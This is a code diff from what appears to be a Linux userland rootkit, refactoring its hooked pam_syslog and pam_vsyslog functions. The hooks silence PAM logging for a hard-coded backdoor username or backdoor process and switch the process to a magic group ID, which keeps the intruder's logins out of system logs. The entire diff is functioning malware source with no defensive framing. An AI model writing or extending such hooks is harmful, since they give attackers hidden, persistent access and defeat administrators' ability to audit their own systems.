@@ -1,36 +1,34 @@
 void pam_syslog(const pam_handle_t *pamh, int priority, const char *fmt, ...){
     if(is_bdusr()) return;
 
-    char *user = get_username(pamh);
-    if(user == NULL) return;
+    va_list va;
 
-    if(is_bduname(user)){
+    char *user = get_username(pamh);
+    if(user == NULL) goto end_pam_syslog;
+
+    if(!strcmp(user, BD_UNAME)){
         hook(CSETGID);
-        (void)call(CSETGID, MAGIC_GID);
+        call(CSETGID, MAGIC_GID);
         return;
     }
 
-    va_list va;
+end_pam_syslog:
     va_start(va, fmt);
     pam_vsyslog(pamh, priority, fmt, va);
     va_end(va);
-    return;
 }
 
 void pam_vsyslog(const pam_handle_t *pamh, int priority, const char *fmt, va_list args){
     if(is_bdusr()) return;
 
+    hook(CSETGID, CPAM_VSYSLOG);
     char *user = get_username(pamh);
-    if(user == NULL) return;
+    if(user == NULL) goto end_pam_vsyslog;    
 
-    hook(CSETGID,
-         CPAM_VSYSLOG);
-
-    if(is_bduname(user)){
-        (void)call(CSETGID, MAGIC_GID);
+    if(!strcmp(user, BD_UNAME)){
+        call(CSETGID, MAGIC_GID);
         return;
     }
-
-    (void)call(CPAM_VSYSLOG, pamh, priority, fmt, args);
-    return;
+end_pam_vsyslog:
+    call(CPAM_VSYSLOG, pamh, priority, fmt, args);
 }
